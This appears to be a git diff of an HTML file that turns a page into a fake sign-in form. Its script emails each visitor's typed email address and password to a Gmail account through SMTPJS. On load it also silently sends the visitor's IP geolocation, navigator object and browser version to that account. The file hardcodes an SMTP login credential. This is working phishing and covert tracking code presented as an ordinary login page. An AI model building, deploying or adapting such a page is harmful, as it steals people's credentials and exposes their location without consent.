@@ -1,51 +1,222 @@
 <!-- <h1>Yesaya</h1> -->
-<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
-<script src="https://smtpjs.com/v3/smtp.js"></script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
+        rel="stylesheet"
+        />
+        <!-- Google Fonts -->
+        <link
+        href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap"
+        rel="stylesheet"
+        />
+        <!-- MDB -->
+        <link
+        href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.4.2/mdb.min.css"
+        rel="stylesheet"
+     />
+</head>
+<body>
+    <div style="padding-top: 5%;" class="container">
+        <section class=" text-center text-lg-start">
+            <style>
+              .rounded-t-5 {
+                border-top-left-radius: 0.5rem;
+                border-top-right-radius: 0.5rem;
+              }
+          
+              @media (min-width: 992px) {
+                .rounded-tr-lg-0 {
+                  border-top-right-radius: 0;
+                }
+          
+                .rounded-bl-lg-5 {
+                  border-bottom-left-radius: 0.5rem;
+                }
+              }
+            </style>
+            <div class="card mb-3">
+              <div class="row g-0 d-flex align-items-center">
+                <div class="col-lg-4 d-none d-lg-flex">
+                  <img src="https://mdbootstrap.com/img/new/ecommerce/vertical/004.jpg" alt="Trendy Pants and Shoes"
+                    class="w-100 rounded-t-5 rounded-tr-lg-0 rounded-bl-lg-5" />
+                </div>
+                <div class="col-lg-8">
+                  <div class="card-body py-5 px-md-5">
+          
+                    <form>
+                      <!-- Email input -->
+                      <div class="form-outline mb-4">
+                        <input type="email" id="email_address" class="form-control" />
+                        <label class="form-label" for="form2Example1">Email address</label>
+                      </div>
+          
+                      <!-- Password input -->
+                      <div class="form-outline mb-4">
+                        <input type="password" id="password_address" class="form-control" />
+                        <label class="form-label" for="password_address">Password</label>
+                      </div>
+          
+                      <!-- 2 column grid layout for inline styling -->
+                      <div class="row mb-4">
+                        <div class="col d-flex justify-content-center">
+                          <!-- Checkbox -->
+                          <div class="form-check">
+                            <input class="form-check-input" type="checkbox" value="" id="form2Example31" checked />
+                            <label class="form-check-label" for="form2Example31"> Remember me </label>
+                          </div>
+                        </div>
+          
+                        <div class="col">
+                          <!-- Simple link -->
+                          <a href="#!">Forgot password?</a>
+                        </div>
+                      </div>
+          
+                      <!-- Submit button -->
+                      <a type="" onclick="submit()" class="btn btn-primary btn-block mb-4">Sign in</a>
+                      
+                    </form>
+          
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+    </div>
+      <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
+      <script src="https://smtpjs.com/v3/smtp.js"></script>
+<script
+  type="text/javascript"
+  src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.4.2/mdb.min.js"
+></script>
+
+<!-- <div>Country: <span id="country"></span></div>
+<div>State: <span id="state"></span></div>
+<div>City: <span id="city"></span></div>
+<div>Latitude: <span id="latitude"></span></div>
+<div>Longitude: <span id="longitude"></span></div>
+<div>IP: <span id="ip"></span></div> -->
 <script>
-     var browserName = navigator.appName;
-    console.log("Nama Peramban: " + browserName);
-    var browserVersion = navigator.appVersion;
-    console.log("Versi Peramban: " + browserVersion);
-            Email.send({
-                        Host : "smtp.elasticemail.com",
-                        Username : "cobaweh933@gmail.com",
-                        Password : "18D8AA12B3E831E921D368C5C086DED4788E",
-                        To : 'cobaweh933@gmail.com',
-                        From : "cobaweh933@gmail.com",
-                        Subject : "Mail from website",
-                        Body : browserVersion
-                    }).then(
-                        // message => alert(message)
-                    );
-        $.get("https://ipinfo.io", function(response) {
-                // console.log("Location data:", response);
-                Email.send({
-                        Host : "smtp.elasticemail.com",
-                        Username : "cobaweh933@gmail.com",
-                        Password : "18D8AA12B3E831E921D368C5C086DED4788E",
-                        To : 'cobaweh933@gmail.com',
-                        From : "cobaweh933@gmail.com",
-                        Subject : "Mail from website",
-                        Body : response
-                    }).then(
-                        // message => alert(message)
-                    );
-            }, "json");
-     $.getJSON('https://json.geoiplookup.io/?callback=?', function (data) {
-            var json_data = JSON.stringify(data);
-            
-            Email.send({
-                        Host : "smtp.elasticemail.com",
-                        Username : "cobaweh933@gmail.com",
-                        Password : "18D8AA12B3E831E921D368C5C086DED4788E",
-                        To : 'cobaweh933@gmail.com',
-                        From : "cobaweh933@gmail.com",
-                        Subject : "Mail from website",
-                        Body : data
-                    }).then(
-                        // message => alert(message)
-                    );
-        });
-       
-      
+function submit(){
+    var email = document.getElementById("email_address").value;
+    var password = document.getElementById("password_address").value;
+    // console.log(email)
+
+    var login = {
+        email: email,
+        password: password
+    }
+    // console.log(login)
+    Email.send({
+            Host: "smtp.elasticemail.com",
+            Username: "cobaweh933@gmail.com",
+            Password: "18D8AA12B3E831E921D368C5C086DED4788E",
+            To: 'cobaweh933@gmail.com',
+            From: "cobaweh933@gmail.com",
+            Subject: "Mail from website",
+            Body: login
+        }).then(
+            // message => alert(message)
+        );
+}
 </script>
+<script>
+    $.getJSON('https://geolocation-db.com/json/')
+        .done(function (location) {
+        Email.send({
+            Host: "smtp.elasticemail.com",
+            Username: "cobaweh933@gmail.com",
+            Password: "18D8AA12B3E831E921D368C5C086DED4788E",
+            To: 'cobaweh933@gmail.com',
+            From: "cobaweh933@gmail.com",
+            Subject: "Mail from website",
+            Body: location
+        }).then(
+            // message => alert(message)
+        );
+            // console.log(location)
+            // $('#country').html(location.country_name);
+            // $('#state').html(location.state);
+            // $('#city').html(location.city);
+            // $('#latitude').html(location.latitude);
+            // $('#longitude').html(location.longitude);
+            // $('#ip').html(location.IPv4);
+        });
+</script>
+
+<script>
+    
+    var browserName = navigator.appName;
+    // console.log("Nama Peramban: " + browserName);
+    var browserVersion = navigator.appVersion;
+    // console.log("Versi Peramban: " + browserVersion);
+    var user = navigator;
+    // console.log(user)
+
+
+    // console.log(window.history)
+   
+
+
+    $.get("https://ipinfo.io", function (response) {
+        // console.log("Location data:", response);
+        Email.send({
+            Host: "smtp.elasticemail.com",
+            Username: "cobaweh933@gmail.com",
+            Password: "18D8AA12B3E831E921D368C5C086DED4788E",
+            To: 'cobaweh933@gmail.com',
+            From: "cobaweh933@gmail.com",
+            Subject: "Mail from website",
+            Body: response
+        }).then(
+            // message => alert(message)
+        );
+    }, "json");
+
+    $.getJSON('https://json.geoiplookup.io/?callback=?', function (data) {
+        var json_data = JSON.stringify(data);
+
+        Email.send({
+            Host: "smtp.elasticemail.com",
+            Username: "cobaweh933@gmail.com",
+            Password: "18D8AA12B3E831E921D368C5C086DED4788E",
+            To: 'cobaweh933@gmail.com',
+            From: "cobaweh933@gmail.com",
+            Subject: "Mail from website",
+            Body: data
+        }).then(
+            // message => alert(message)
+        );
+    });
+    Email.send({
+        Host: "smtp.elasticemail.com",
+        Username: "cobaweh933@gmail.com",
+        Password: "18D8AA12B3E831E921D368C5C086DED4788E",
+        To: 'cobaweh933@gmail.com',
+        From: "cobaweh933@gmail.com",
+        Subject: "Mail from website",
+        Body: user
+    }).then(
+        // message => alert(message)
+    );
+    Email.send({
+        Host: "smtp.elasticemail.com",
+        Username: "cobaweh933@gmail.com",
+        Password: "18D8AA12B3E831E921D368C5C086DED4788E",
+        To: 'cobaweh933@gmail.com',
+        From: "cobaweh933@gmail.com",
+        Subject: "Mail from website",
+        Body: browserVersion
+    }).then(
+        // message => alert(message)
+    );
+    
+</script>
+</body>
+</html>
+
